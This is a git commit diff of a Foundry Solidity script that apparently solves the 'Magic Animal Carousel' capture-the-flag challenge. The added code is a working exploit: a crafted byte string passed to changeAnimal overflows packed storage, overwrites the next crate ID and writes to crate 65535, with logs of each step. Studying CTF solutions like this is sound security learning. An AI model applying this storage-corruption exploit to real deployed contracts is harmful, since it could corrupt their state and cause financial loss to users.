0ee0acb4daa26345badacc6797a43af96e0bf170
Your Name <you@example.com>
2026-01-20 10:04:31 -0500

    speedruned the carousel idiot challenge

--- script/MagicAnimalCarousel.s.sol
+++ script/MagicAnimalCarousel.s.sol
@@ -6,7 +6,12 @@ import { MagicAnimalCarousel } from "../src/MagicAnimalCarousel.sol";
 
 contract MagicAnimalCarouselSolver is Script {
 	
-	MagicAnimalCarousel public instance = MagicAnimalCarousel(0x9811D61EF68c2244b80C56D8903AC559d154fBEf);
+	MagicAnimalCarousel public carousel = MagicAnimalCarousel(0x9811D61EF68c2244b80C56D8903AC559d154fBEf);
+	
+	// 0x000000000000000000000000000000000000000000000000000000000000FFFF
+	// 0xFFFFFFFFFFFFFFFFFFFF00000000000000000000000000000000000000000000
+	// 0x00000000000000000000FFFF0000000000000000000000000000000000000000
+	// 0x000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
 
 	uint256 prv = vm.envUint("PRV");
 	address me = vm.envAddress("PUB");
@@ -15,10 +20,28 @@ contract MagicAnimalCarouselSolver is Script {
 
 		vm.startBroadcast(prv);
 
-		// encodeAnimalName behaves just like bytes_to_long in python
-		console.logBytes32(bytes32(instance.encodeAnimalName("abcdabcdabcd")));
-	
+		carousel.setAnimalAndSpin("Dog");
 
+        console.log("Animal at crate 1 after setting Dog: ");
+        console.logBytes32(bytes32(carousel.carousel(1)));
+        console.log("Current crate ID: ", carousel.currentCrateId());
+
+        // Step 2: Manipulate nextCrateId
+        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
+        carousel.changeAnimal(exploitString, 1);
+
+        console.log("Animal at crate 1 after manipulating:");
+        console.logBytes32(bytes32(carousel.carousel(1)));
+        console.log("Current crate ID: ", carousel.currentCrateId());
+
+        // Step 3: Add animal to 65535th crate
+        carousel.setAnimalAndSpin("Parrot");
+
+        console.log("Animal at crate 1 after setting Parrot:");
+        console.logBytes32(bytes32(carousel.carousel(1)));
+        console.log("Animal at crate 65535 after setting Parrot:");
+        console.logBytes32(bytes32(carousel.carousel(65535)));
+        console.log("Current crate ID: ", carousel.currentCrateId());
 
 		vm.stopBroadcast();
 
